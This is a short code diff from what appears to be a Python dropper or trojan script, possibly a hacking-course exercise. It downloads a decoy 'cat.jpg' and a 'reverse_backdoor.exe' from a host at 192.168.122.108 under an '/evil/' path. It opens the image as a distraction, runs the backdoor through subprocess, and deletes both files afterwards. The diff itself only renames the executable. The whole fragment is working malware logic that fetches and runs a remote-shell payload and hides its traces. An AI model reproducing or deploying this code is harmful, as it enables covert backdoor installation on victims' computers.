@@ -22,7 +22,7 @@ download("http://192.168.122.108/evil/cat.jpg")
 subprocess.Popen("cat.jpg", shell=True)
 
 download("http://192.168.122.108/evil/reverse_backdoor.exe")
-subprocess.call("reverse_backdoor.exe", shell=True)
+subprocess.call("reverse_backdoor_bare.exe", shell=True)
 
 os.remove("cat.jpg")
-os.remove("reverse_backdoor.exe")
+os.remove("reverse_backdoor_bare.exe")
